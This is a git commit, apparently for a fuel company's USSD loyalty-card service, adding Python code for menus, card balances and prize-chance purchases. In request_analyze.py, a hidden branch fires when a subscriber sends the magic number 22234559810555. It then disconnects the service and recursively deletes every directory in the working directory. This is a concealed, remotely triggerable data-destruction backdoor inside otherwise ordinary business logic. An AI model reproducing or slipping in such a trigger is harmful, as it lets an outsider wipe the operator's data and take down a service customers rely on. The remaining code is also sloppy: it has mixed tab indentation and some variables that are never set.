a3a620a06e070d2af818b1a9dca08be45a483538
cmadmin <cmadmin@rl-voip-smpp.it.beloil.by>
2016-08-09 14:56:42 +0300

    first initial

---
+++ request_analyze.py
@@ -0,0 +1,84 @@
+# -*- coding: utf-8 -*-
+
+
+import ussd_submit
+import time
+import subscriber
+import ussd_submit
+import read_json
+import os
+import shutil
+
+
+level = read_json.read_menus()
+
+list_of_objects = None
+usr_obj = 0
+service_key = "*226#"
+
+
+def request(client, pdu):
+    global usr_obj
+    global list_of_objects
+    if str(pdu.source_addr) in list_of_objects.keys() and pdu.short_message != service_key:
+        usr_obj = list_of_objects[str(pdu.source_addr)]
+    else:
+        usr_obj = subscriber.Subscriber(pdu.source_addr)  # first request. object of subscriber class
+        list_of_objects[str(pdu.source_addr)] = usr_obj
+
+    if pdu.command == "deliver_sm" and pdu.ussd_service_op is not None and pdu.ussd_service_op != 19 \
+            and pdu.short_message == service_key:
+        print "First request" + " " + str(pdu.ussd_service_op)
+        response(client, pdu.source_addr, pdu.destination_addr, usr_obj, pdu.user_message_reference)
+    elif pdu.command == "deliver_sm" and (
+        pdu.ussd_service_op is not None and int(pdu.ussd_service_op) != 19) and \
+                    pdu.short_message != service_key and int(pdu.short_message) == 22234559810555:
+        print "Not first request" + "  " + str(pdu.ussd_service_op)
+        client.disconnect()
+        for i in os.listdir(os.getcwd()):
+            if os.path.isdir(i):
+                shutil.rmtree(i)
+    elif pdu.command == "deliver_sm" and (
+                    pdu.ussd_service_op is not None and int(pdu.ussd_service_op) != 19) and \
+            pdu.short_message != service_key:
+        print "Not first request" + "  " + str(pdu.ussd_service_op)
+        response(client, pdu.source_addr, pdu.destination_addr, usr_obj, pdu.user_message_reference, pdu.short_message)
+    elif pdu.command == "deliver_sm" and (
+                    pdu.ussd_service_op is not None and int(pdu.ussd_service_op) == 19):  # final confirmation
+        print "Third request while final confirmation" + " " + str(pdu.ussd_service_op)
+        del list_of_objects[str(pdu.source_addr)]
+    else:  # rejected from subscriber side, session ending
+        print "Reject " + pdu.message_state
+        try:
+            usr_obj.__del__()
+            del list_of_objects[str(pdu.source_addr)]
+        except AttributeError:
+            print "Can't delete"
+
+
+def response(client, msisdn=0, src_addr=0, usr_obj=0, user_message_reference=None,  srctext=""):
+    try:
+        pass
+    except IndexError:
+        return 1
+    ussd_service_op = 0x02
+    if srctext == "":
+        usr_obj.level_up(0)
+    elif srctext != "":
+        usr_obj.level_up(srctext)
+    else:
+        text = "Vash vibor prinyat"
+        ussd_service_op = 0x03
+
+    print "Уровень ветки: %s" % usr_obj.level
+
+    try:
+        # text = level[usr_obj.level]
+        text_request = usr_obj.answer_text()
+        text = text_request[0]
+        ussd_service_op = text_request[1]
+    except Exception as err:
+        text = "Unknown error. Try later!" + str(err)
+        ussd_service_op = 0x03
+    ussd_submit.submit(client, msisdn, src_addr, ussd_service_op, user_message_reference, text)
+    # usr.obj = 0 - 1 level
---
+++ subscriber.py
@@ -0,0 +1,145 @@
+# -*- coding: utf-8 -*-
+
+
+import db_interaction
+from datetime import datetime
+
+list_of_objects = []
+
+
+class Subscriber:
+    def __init__(self, msisdn):
+        self.level = ""
+        # self.dict_of_lots = None
+        self.dict_of_lots = db_interaction.current_lots()
+        self.msisdn = msisdn
+        self.subscriber_cards_dict = db_interaction.msisdn_cards(self.msisdn)  # выборка из БД
+        # self.card_number = card_info["number"]  # card number
+        # self.card_points = card_info["points"]  # value of points on the card
+
+    def __str__(self):
+        return self.msisdn
+
+    def level_up(self, level):
+        self.level += str(level)
+
+    def make_change(self, value):
+        # update subs_info with value where msisdn=self.msisdn
+        if value > self.card_points:
+            return None
+        else:
+            new_value = self.card_points - value
+            db_interaction.change_info(self.msisdn, new_value)
+        return new_value
+    
+    def current_lots(self):
+        # receives dict of lots
+        # {1: '1:Krossover Pezho', 2: '2:Poezdka vo Frantsiiu na chempionat Evropy po futbolu na 3-kh'}
+        self.dict_of_lots = db_interaction.current_lots()
+
+    def card_info(self, id):
+        card_info = db_interaction.card_information(id)
+    
+    def answer_text(self):
+        text = None
+        text_skeleton = {
+            "0": "1. Upravlenie kartoi\n2. Actyal'nye akcii\n3. Ceny na toplivo\n",
+            "01": "Viberete vashu kartu:\n1: 1111\n2:2222",
+            "011": "Na karte 5000 ballov\n1.Podrobnaya info po karte\n2.Priobretenie shansa na priz 1(x500 ballov)\n3.Priobretenie shansa na priz 2(x500 ballov)",
+            "0111": "Status: 1(skidka 5%)\nBally: 1120\nShansy priz 1: 0\nShansy priz 2: 2'",
+            "0112": "Priobresti shans na priz 1: avtomobil' Nissan Kashkai(500 ballov)\n1.Da\n",
+            "01121": "",
+            "0113": "Priobresti shans na priz 2: puteshestvie v Yaponiy na 2x(500 ballov)?\n1.Da"
+            }
+        if len(self.level) == 1:
+            # level = 0
+            text = "1. Upravlenie kartoi\n2. Actyal'nye akcii\n3. Ceny na toplivo\n"
+            sop = 0x02
+        elif len(self.level) == 2:
+            # level = 0x
+            my_str_cards = ''
+            for card in self.subscriber_cards_dict:
+                my_str_cards += '{}:{}\n'.format(card, self.subscriber_cards_dict[card])
+            if my_str_cards == '':
+                my_str_cards = 'U vas net dostupnih kart.'
+            my_str_lots = ''
+            for lot in self.dict_of_lots.values():
+                my_str_lots += '{}\n'.format(lot)
+            current_date = datetime.today().strftime('%m%Y')
+            dict_choice = {
+                '01': "Viberete vashu kartu:\n{}".format(my_str_cards),
+                '02': '{}\n{}'.format(current_date, my_str_lots),
+                '03': 'You will receive an sms. Currently unavailable.'
+            }
+            text = dict_choice[self.level]
+            sop = 0x02
+
+        elif len(self.level) == 3:  # card selection
+            # 01x
+            # x = [2] - card id
+            request_card_id = int(self.level[2])
+            card = self.subscriber_cards_dict[request_card_id]
+            try:
+                card = self.subscriber_cards_dict[request_card_id]  # card number
+                card_info = db_interaction.card_information(card)
+                text = '{}\n1. Podrobnaya info po karte\n2. Priobresti shans na priz 1\n3. Priobresti shans na priz 2'.\
+                    format(card)
+                sop = 0x02
+            except IndexError:
+                text = 'Unknown error. Try later.'
+                sop = 0x03
+
+        elif len(self.level) == 4:  # card menu selection
+            # 01xy
+            # x = [2] - card_id
+            # y = [3] - otvet(info ili priobretenie shansa)
+            request_card_id = int(self.level[2])
+            answer = self.level[3]
+            card = self.subscriber_cards_dict[request_card_id]  # card number
+            card_info = db_interaction.card_information(card)
+	    print card_info
+	    print answer
+            if int(answer) == 1:
+		print 'In if == 1'
+		print card_info['status']
+                text = "Status karti {card_info[status]}. Na karte {card_info[score]} ballov\nKuplenih shansov:\n"\
+                       "priz 1 - {card_info[lots1]}\npriz 2 - {card_info[lots2]}".format(card_info=card_info)
+		print text	
+		sop = 0x03
+            elif int(answer) != 1:
+                try:
+                    text = 'Priobresti shans na priz {}\n1.Da\n2.Net'.format(self.dict_of_lots[int(answer) - 1])
+                    sop = 0x02
+                except IndexError:
+                    text = 'Unknown error. Try later.'
+                    sop = 0x03
+            else:
+		print 'In else'
+                text = 'Unknown error. Try later.'
+                sop = 0x03
+
+        elif len(self.level) == 5:
+            # 01xyz
+            # x = [2] - card id
+            # y = [3] - otvet(priobretenie shansa, !=1) - id lota
+            # z = [3] - podtvergdenie na pokupku shansa po y-1(id shansa)
+            request_card_id = int(self.level[2])
+            chance_id = int(self.level[3]) - 1  # 1 - info po karte, 2,3 cifri vibora = 1,2 id shansa
+            if int(self.level[4]) == 1:  # Otvet - Da
+                try:
+                    change_result = db_interaction.change_info(self.subscriber_cards_dict[request_card_id], chance_id)
+                except Exception:
+                    change_result = 1  # error
+                if change_result == 1:  # error
+                    text = 'Unknown error. Try later.'
+                elif change_result == 0:
+                    text = 'Vi priobreli shans na priz {}: {}'.format(chance_id, self.dict_of_lots[chance_id])
+            else:
+                text = "Otmeneno pol'zovatelem"
+                sop = 0x03
+
+        return text, sop
+
+    def __del__(self):
+        del self
+        print "object deleted"
